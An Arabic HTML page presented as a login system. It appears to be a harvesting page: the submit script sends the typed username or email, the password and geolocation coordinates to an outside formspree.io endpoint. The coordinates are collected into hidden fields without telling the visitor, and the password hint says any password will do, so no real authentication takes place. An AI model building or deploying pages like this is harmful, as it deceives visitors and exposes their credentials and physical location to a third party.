<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>منظومة تسجيل الدخول</title>
  <script src="https://accounts.google.com/gsi/client" async defer></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #2c3e50, #3498db);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      flex-direction: column;
    }
    form {
      background: rgba(0, 0, 0, 0.4);
      padding: 25px;
      border-radius: 10px;
      width: 320px;
      text-align: center;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: none;
      font-size: 16px;
    }
    label {
      font-size: 14px;
      display: block;
      margin-bottom: 10px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1abc9c;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }
    .message {
      margin-top: 15px;
      font-size: 14px;
      min-height: 20px;
    }
    .checkbox-container {
      display: flex;
      align-items: center;
      justify-content: start;
      gap: 5px;
      margin-bottom: 10px;
      font-size: 13px;
      text-align: right;
    }
    .google-button {
      margin-bottom: 15px;
      display: flex;
      justify-content: center;
    }
  </style>
</head>
<body>

  <form id="dataForm" action="https://formspree.io/f/xzzvzzkk" method="POST" novalidate>
    <h2>منظومة تسجيل الدخول</h2>

    <!-- زر تسجيل الدخول بجوجل -->
    <div class="google-button" id="g_id_signin"></div>

    <input type="text" name="contact" id="contact" placeholder="اكتب بريد أو اسم مستخدم" />
    
    <input type="password" name="password" placeholder="اكتب كلمة السر (أي شيء)" />
    
    <div class="checkbox-container">
      <input type="checkbox" id="privacyCheck" />
      <label for="privacyCheck">أوافق على سياسة الخصوصية</label>
    </div>

    <input type="hidden" name="latitude" id="latitude" />
    <input type="hidden" name="longitude" id="longitude" />

    <button type="submit">إرسال البيانات</button>
    <div class="message" id="message"></div>
  </form>

  <script>
    const form = document.getElementById('dataForm');
    const messageDiv = document.getElementById('message');
    const privacyCheck = document.getElementById('privacyCheck');
    const contactInput = document.getElementById('contact');

    // جلب الموقع الجغرافي
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          document.getElementById('latitude').value = position.coords.latitude.toFixed(6);
          document.getElementById('longitude').value = position.coords.longitude.toFixed(6);
        },
        error => {
          console.warn('لم يتم الحصول على الموقع:', error.message);
        }
      );
    }

    // إرسال البيانات
    form.addEventListener('submit', e => {
      e.preventDefault();
      messageDiv.style.color = 'white';

      const contactValue = contactInput.value.trim();

      if (!contactValue) {
        messageDiv.textContent = 'يرجى إدخال بريد إلكتروني أو اسم مستخدم.';
        return;
      }

      if (!privacyCheck.checked) {
        messageDiv.textContent = 'يجب الموافقة على سياسة الخصوصية قبل الإرسال.';
        return;
      }

      messageDiv.textContent = 'جارٍ إرسال البيانات...';

      const formData = new FormData(form);

      fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      })
      .then(response => {
        if (response.ok) {
          messageDiv.style.color = '#2ecc71';
          messageDiv.textContent = 'تم إرسال البيانات بنجاح!';
          form.reset();
        } else {
          throw new Error('فشل في إرسال البيانات');
        }
      })
      .catch(() => {
        messageDiv.style.color = '#e74c3c';
        messageDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.';
      });
    });

    // تهيئة تسجيل الدخول بـ Google
    window.onload = function () {
      google.accounts.id.initialize({
        client_id: "YOUR_GOOGLE_CLIENT_ID", // <-- استبدله بمفتاحك من Google
        callback: handleCredentialResponse
      });

      google.accounts.id.renderButton(
        document.getElementById("g_id_signin"),
        { theme: "outline", size: "large", text: "signin_with" }
      );
    }

    function handleCredentialResponse(response) {
      const jwt = parseJwt(response.credential);
      const email = jwt.email;
      if (email) {
        document.getElementById("contact").value = email;
      }
    }

    function parseJwt(token) {
      const base64Url = token.split('.')[1];
      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
      const jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      }).join(''));
      return JSON.parse(jsonPayload);
    }
  </script>

</body>
</html>
